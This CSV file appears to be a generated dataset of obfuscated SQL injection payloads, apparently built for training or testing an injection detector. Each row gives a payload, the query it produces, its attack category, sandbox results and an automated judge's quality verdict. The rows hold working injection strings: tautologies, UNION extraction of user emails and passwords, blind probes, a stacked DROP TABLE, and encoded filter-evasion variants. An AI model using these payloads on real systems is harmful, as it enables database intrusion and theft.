query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q01224,/**/1 AND (SELECT /**/COUNT(/**/*)/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin')--,SELECT * FROM users WHERE id = /**/1 AND (SELECT /**/COUNT(/**/*)/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin')--,comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""Count"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01225,--1' OR (SELECT /**/MAX(username)/**/FROM/**/users/**/WHERE/**/id/**/=/**/1),SELECT * FROM users WHERE id = --1' OR (SELECT /**/MAX(username)/**/FROM/**/users/**/WHERE/**/id/**/=/**/1),comment_obfuscation,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01227,1' -- (SELECT CASE WHEN (1=1) THEN CHAR(0) ELSE CHAR(1) END),SELECT * FROM users WHERE id = 1' -- (SELECT CASE WHEN (1=1) THEN CHAR(0) ELSE CHAR(1) END),comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01230,#1' AND ((SELECT password FROM users WHERE id = (SELECT MIN(id) FROM users)))#,SELECT * FROM users WHERE id = #1' AND ((SELECT password FROM users WHERE id = (SELECT MIN(id) FROM users)))#,comment_obfuscation,user_lookup,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01232,' OR 1=1 /**/,SELECT * FROM orders WHERE status = '' OR 1=1 /**/' ORDER BY date DESC,comment_obfuscation,order_filter,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01233,-- /**/ ' OR 1=1 /**/,SELECT * FROM orders WHERE status = '-- /**/ ' OR 1=1 /**/' ORDER BY date DESC,comment_obfuscation,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01234,# ' OR 1=1 /*,SELECT * FROM orders WHERE status = '# ' OR 1=1 /*' ORDER BY date DESC,comment_obfuscation,order_filter,1,0,0.0,True,mysql,[],True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01235,' OR 1=1/**/#,SELECT * FROM orders WHERE status = '' OR 1=1/**/#' ORDER BY date DESC,comment_obfuscation,order_filter,1,0,0.0,True,mysql,"[""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01238,"/*' OR ASCII(SUBSTRING(status,1,1)) > 51 */","SELECT * FROM orders WHERE status = '/*' OR ASCII(SUBSTRING(status,1,1)) > 51 */' ORDER BY date DESC",comment_obfuscation,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01239,' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--,SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--' ORDER BY date DESC,comment_obfuscation,order_filter,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Exists""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01240,"' OR 1=CAST(ASCII(SUBSTRING(status,1,1)) AS BIT)","SELECT * FROM orders WHERE status = '' OR 1=CAST(ASCII(SUBSTRING(status,1,1)) AS BIT)' ORDER BY date DESC",comment_obfuscation,order_filter,1,0,0.0,True,default,"[""Cast"", ""DataType"", ""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Substring"", ""Ascii"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01241,"[""/*"") OR ('1'='1"",--)"", ""--('1'='1"")#"", ""/*"") OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'comments%')--"", ""/*"") OR ('1'='')#""]","INSERT INTO comments (user_id, body) VALUES (1, '[""/*"") OR ('1'='1"",--)"", ""--('1'='1"")#"", ""/*"") OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'comments%')--"", ""/*"") OR ('1'='')#""]')",comment_obfuscation,comment_insert,1,0,0.0,True,tsql,"[""Column"", ""Identifier""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01242,"--('1'='') UNION ALL SELECT NULL, CONCAT(CHAR(65), CHAR(66), CHAR(67))","INSERT INTO comments (user_id, body) VALUES (1, '--('1'='') UNION ALL SELECT NULL, CONCAT(CHAR(65), CHAR(66), CHAR(67))')",comment_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01245,' OR (SELECT COUNT(*) FROM users WHERE user_id=1) > 0 AND '--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT COUNT(*) FROM users WHERE user_id=1) > 0 AND '--')",comment_obfuscation,comment_insert,1,0,0.0,True,default,"[""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01247,1'''/**/,"INSERT INTO comments (user_id, body) VALUES (1, '1'''/**/')",comment_obfuscation,comment_insert,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01251,1' and EXISTS(SELECT CASE WHEN (CAST((SELECT @@VERSION) AS VARCHAR) LIKE '%') THEN 1 ELSE 0 END)--,SELECT * FROM users WHERE username = '1' and EXISTS(SELECT CASE WHEN (CAST((SELECT @@VERSION) AS VARCHAR) LIKE '%') THEN 1 ELSE 0 END)--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,"[""DataType"", ""Subquery"", ""Star"", ""Like"", ""Select"", ""Var"", ""And"", ""If"", ""Paren"", ""Cast"", ""Identifier"", ""From"", ""Exists"", ""Parameter"", ""Literal"", ""Column"", ""Table"", ""Where"", ""EQ"", ""Case""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01252,1' or (SELECT 1 FROM information_schema.tables WHERE table_name='users' AND table_schema='public')=1--,SELECT * FROM users WHERE username = '1' or (SELECT 1 FROM information_schema.tables WHERE table_name='users' AND table_schema='public')=1--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01256,"%'\x22 OR 1=1 --""","SELECT * FROM products WHERE name LIKE '%%'\x22 OR 1=1 --""%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Mod""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01257,"%' UNION ALL SELECT NULL, NULL, NULL, NULL#""","SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT NULL, NULL, NULL, NULL#""%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Mod""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01258,"%' AND (SELECT 1 FROM (SELECT COUNT(*) FROM dual WHERE 1=1))--""","SELECT * FROM products WHERE name LIKE '%%' AND (SELECT 1 FROM (SELECT COUNT(*) FROM dual WHERE 1=1))--""%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Count"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01260,%' OR (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) != 0,SELECT * FROM products WHERE name LIKE '%%' OR (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) != 0%',encoding_obfuscation,search,1,0,0.0,True,default,"[""Or"", ""NEQ"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""If"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Case""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01261,%' OR (SELECT 3 AS num FROM (SELECT 1 UNION SELECT 2)) = 3%,SELECT * FROM products WHERE name LIKE '%%' OR (SELECT 3 AS num FROM (SELECT 1 UNION SELECT 2)) = 3%%',encoding_obfuscation,search,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Mod""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01263,"%' UNION SELECT 4,5,CONCAT(firstname,lastname),email FROM users --","SELECT * FROM products WHERE name LIKE '%%' UNION SELECT 4,5,CONCAT(firstname,lastname),email FROM users --%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Concat"", ""Union""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01264,"%' OR EXISTS(SELECT 1 FROM orders WHERE user_id = (SELECT id FROM users WHERE username LIKE CONCAT('%',SUBSTR(@@version,1,1),'%')))","SELECT * FROM products WHERE name LIKE '%%' OR EXISTS(SELECT 1 FROM orders WHERE user_id = (SELECT id FROM users WHERE username LIKE CONCAT('%',SUBSTR(@@version,1,1),'%')))%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Or"", ""Subquery"", ""Parameter"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Like"", ""Substring"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Var"", ""Concat"", ""Exists""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01265,%' --; DROP TABLE IF EXISTS temp_table;--,SELECT * FROM products WHERE name LIKE '%%' --; DROP TABLE IF EXISTS temp_table;--%',encoding_obfuscation,search,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01266,"[""%\""\' AND 1=1 --""","SELECT * FROM users WHERE id = [""%\""\' AND 1=1 --""",encoding_obfuscation,user_lookup,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01267,1'%2b(SELECT%201%20FROM%20system.users)%2b'--,SELECT * FROM users WHERE id = 1'%2b(SELECT%201%20FROM%20system.users)%2b'--,encoding_obfuscation,user_lookup,1,0,0.0,True,mysql,"[""Literal"", ""Alias"", ""Identifier""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01268,1'%2bCHAR(85)%2bCHAR(85)%2bCHAR(85)--,SELECT * FROM users WHERE id = 1'%2bCHAR(85)%2bCHAR(85)%2bCHAR(85)--,encoding_obfuscation,user_lookup,1,0,0.0,True,mysql,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Mod"", ""Anonymous""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01269,"1'%2bCONCAT(UPPER(MID(@@VERSION,1,1)),LOWER(MID(@@VERSION,2,LENGTH(@@VERSION))))--","SELECT * FROM users WHERE id = 1'%2bCONCAT(UPPER(MID(@@VERSION,1,1)),LOWER(MID(@@VERSION,2,LENGTH(@@VERSION))))--",encoding_obfuscation,user_lookup,1,0,0.0,True,mysql,"[""Lower"", ""Length"", ""Literal"", ""Upper"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""SessionParameter"", ""Select"", ""Where"", ""EQ"", ""From"", ""Mod"", ""Anonymous""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01272,--'%20OR%204747%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||(select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual||CHR(113)||CHR(122)||CHR(118)||CHR(122)||CHR(113)))--,SELECT * FROM orders WHERE status = '--'%20OR%204747%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113)||(select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual||CHR(113)||CHR(122)||CHR(118)||CHR(122)||CHR(113)))--' ORDER BY date DESC,encoding_obfuscation,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01273,1' AND 3580 = (SELECT COUNT(*) FROM users JOIN roles ON users.role_id = roles.id WHERE roles.name = 'admin') --,SELECT * FROM orders WHERE status = '1' AND 3580 = (SELECT COUNT(*) FROM users JOIN roles ON users.role_id = roles.id WHERE roles.name = 'admin') --' ORDER BY date DESC,encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Count"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Join"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01274,"CHAR(49)' UNION ALL SELECT NULL, NULL, NULL FROM products INNER JOIN categories ON products.category_id = categories.id WHERE categories.name LIKE '%electronics%'--","SELECT * FROM orders WHERE status = 'CHAR(49)' UNION ALL SELECT NULL, NULL, NULL FROM products INNER JOIN categories ON products.category_id = categories.id WHERE categories.name LIKE '%electronics%'--' ORDER BY date DESC",encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Like"", ""Join"", ""Table"", ""Null"", ""Select"", ""Where"", ""EQ"", ""From"", ""Union""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
